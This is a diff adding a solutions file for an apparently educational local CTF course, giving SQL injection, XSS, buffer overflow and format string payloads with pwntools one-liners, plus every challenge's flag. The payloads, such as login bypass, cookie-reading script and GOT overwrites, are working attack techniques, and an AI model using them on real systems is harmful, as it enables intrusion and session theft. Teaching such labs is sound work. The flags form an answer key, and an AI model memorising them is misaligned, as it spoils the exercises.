@@ -1,0 +1,160 @@
+# CTF Challenge Solutions
+
+These solutions are for the local educational CTF application only. Submit each
+recovered value through the matching module's Submit Flag form.
+
+## SQL Injection
+
+### SQLi-1 Product Search
+The search query returns three columns. Close the LIKE string, return three
+compatible columns, and comment out the original suffix:
+
+' UNION SELECT 1,flag,'' FROM flags WHERE challenge=1-- 
+
+The product result list displays COMP6841{K7mP2aQ9}.
+
+### SQLi-2 Advanced Search
+Literal spaces and tabs are rejected. SQLite comments can separate SQL tokens.
+Use a block comment to consume the appended LIKE suffix:
+
+'/**/UNION/**/SELECT/**/1,flag,''/**/FROM/**/flags/**/WHERE/**/challenge=2/*
+
+The result contains COMP6841{R8tW3xK5}.
+
+### SQLi-3 User Directory
+The page only reports whether a row exists, so use Boolean conditions. For
+example, first confirm the flag length:
+
+1 AND length((SELECT flag FROM flags WHERE challenge=3))=16
+
+Then test each character, changing the position and candidate character:
+
+1 AND substr((SELECT flag FROM flags WHERE challenge=3),1,1)='F'
+
+Repeat until the true responses spell COMP6841{B6dH1sY4}.
+
+### SQLi-4 Admin Portal
+The login query can be terminated in the username field. Enter this username
+and any password:
+
+admin' -- 
+
+The password predicate is commented out. The administrator panel shows
+COMP6841{C9vJ2pL7}.
+
+### SQLi-5 Employee Management
+Register and log in, then save this value as the bio:
+
+%' UNION SELECT 'flag',flag FROM flags WHERE challenge=5--
+
+Choose Export Users. The later export query reuses the stored bio and returns
+COMP6841{M5qZ8nF3}.
+
+## Cross-Site Scripting
+
+### XSS-1 Forum Search
+The backend removes script elements but leaves HTML event handlers. Search for:
+
+<img src=x onerror="alert(document.cookie)">
+
+The cookie dialog contains forum_flag=COMP6841{T4kR9wD2}.
+
+### XSS-2 Post Comments
+Publish a comment that makes the administrator-simulation report request when
+the stored comment is rendered:
+
+<img src=x onerror="fetch('http://localhost:3000/api/xss/2/report',{method:'POST'}).then(r=>r.json()).then(x=>alert(x.flag))">
+
+Reloading or rendering the comment triggers the request and displays
+COMP6841{G7mX1cP8}. The full backend URL is required because the frontend and API
+run on different local ports.
+
+### XSS-3 Live Profile
+Put this URL-encoded HTML in the fragment of the profile URL:
+
+/xss/3#%3Cimg%20src%3Dx%20onerror%3D%22alert(window.xssDomSecret)%22%3E
+
+The page decodes location.hash and inserts it with innerHTML. The alert shows
+COMP6841{V3hN6sQ4}.
+
+## Buffer Overflow
+
+Run BOF binaries in a Linux environment after downloading them. They are built
+without PIE and stack canaries for this course.
+
+### BOF-1 Employee Verification
+The local record has name[32] immediately before team. Send 32 bytes followed
+by B:
+
+python3 -c "print('A' * 32 + 'B')" | ./bof1
+
+This changes team from A to B and prints COMP6841{A8yK5dL1}.
+
+### BOF-2 Binary Login
+Find win and verify the overwrite offset with a cyclic pattern. For the current
+32-byte buffer build, the saved return address is 40 bytes from the input:
+
+nm -n bof2 | grep ' win$'
+python3 -c "import sys; from pwn import p64; sys.stdout.buffer.write(b'A' * 40 + p64(0xWIN_ADDRESS))" | ./bof2
+
+Replace 0xWIN_ADDRESS with win's address in little-endian form. Control returns
+to win and prints COMP6841{P2rF7mW9}.
+
+### BOF-3 Backup Server
+Choose option 1, locate hidden_shell, then use the same return-address method:
+
+nm -n bof3 | grep hidden_shell
+python3 -c "import sys; from pwn import p64; sys.stdout.buffer.write(b'1\\n' + b'A' * 40 + p64(0xHIDDEN_SHELL))" | ./bof3
+
+Replace 0xHIDDEN_SHELL with the discovered address. The hidden function prints
+COMP6841{J6uC3xH8}.
+
+## Format String
+
+Run FS binaries in a 32-bit Linux environment. The binaries are non-PIE and
+their GOT is writable for the course exercises. Use a controlled local Docker
+or VM environment because malformed format strings can crash a process.
+
+### FS-1 Echo Service
+Probe the stack with repeated hexadecimal conversions:
+
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+
+Continue until the flag's little-endian ASCII words appear. Reverse the bytes
+within each 32-bit word to read COMP6841{Z4nB8qT1}.
+
+### FS-2 Authentication Server
+First identify the stack position that contains the local password pointer:
+
+AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x
+
+Then replace the matching conversion with a positional string conversion, for
+example %7$s. Adjust the position until it prints COMP6841{E7pL2vR5}.
+
+### FS-3 Admin Login
+Find the fixed address of admin, then find the input's stack index with an
+AAAA marker:
+
+nm -n fs3 | grep ' admin$'
+
+Build a payload containing the little-endian admin address followed by enough
+padding to print 1337 characters in total, and finish with %INDEX$n. In pwntools:
+
+python3 -c "import sys; from pwn import fmtstr_payload; sys.stdout.buffer.write(fmtstr_payload(INDEX, {ADMIN_ADDRESS: 1337}, write_size='byte'))" | ./fs3
+
+Replace INDEX and ADMIN_ADDRESS using the probe and nm output. The program then
+prints COMP6841{W9cM4kD6}.
+
+### FS-4 System Utility
+Find the puts relocation and the hidden win address:
+
+readelf -r fs4 | grep puts
+nm -n fs4 | grep ' win$'
+
+Determine the input's stack index with an AAAA.%x probe, then create a partial
+GOT overwrite payload:
+
+python3 -c "import sys; from pwn import fmtstr_payload; sys.stdout.buffer.write(fmtstr_payload(INDEX, {PUTS_GOT: WIN_ADDRESS}, write_size='short'))" | ./fs4
+
+Replace INDEX, PUTS_GOT, and WIN_ADDRESS with values from the binary. The puts
+call after printf dispatches to win and prints COMP6841{H3sX7aN2}.
